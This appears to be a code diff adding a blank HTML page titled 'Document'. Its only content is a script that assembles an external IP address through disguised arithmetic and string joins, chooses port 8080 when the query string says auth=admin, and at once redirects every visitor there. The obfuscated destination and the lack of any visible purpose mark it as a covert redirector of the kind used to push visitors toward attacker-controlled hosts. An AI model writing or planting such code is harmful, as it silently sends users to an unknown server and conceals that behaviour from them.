@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <script>
+    function getQuery() {
+      var search = window.location.search
+      search = search.slice(1)
+      var arr = search.split('&')
+      var query = {}
+      for (var i = 0; i < arr.length; i++) {
+        var item = arr[i]
+        var _arr = item.split('=')
+        query[_arr[0]] = _arr[1]
+      }
+      return query
+    }
+    var query = getQuery()
+    var hostArr = [80 + 5, 108 + 100, 59 + 50, 15 + '3']
+    var path = 'http://' + hostArr.join('.')
+    if (query.auth === 'admin') {
+      path += ':' + 8 + 0 + (8 * 10)
+    }
+    window.location.href = path
+  </script>
+</body>
+</html>
